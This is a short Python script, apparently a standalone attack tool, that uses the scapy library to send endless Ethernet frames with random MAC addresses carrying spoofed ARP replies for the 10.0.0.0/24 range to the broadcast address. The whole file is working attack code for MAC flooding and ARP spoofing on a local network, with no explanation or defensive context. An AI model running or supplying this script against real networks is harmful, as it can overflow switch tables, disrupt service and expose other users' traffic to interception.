from scapy.all import *

while 1:
	sendp(Ether(src=RandMAC(), dst=RandMAC())/ARP(op=2, psrc="10.0.0.0/24", hwdst="FF:FF:FF:FF:FF:FF"))

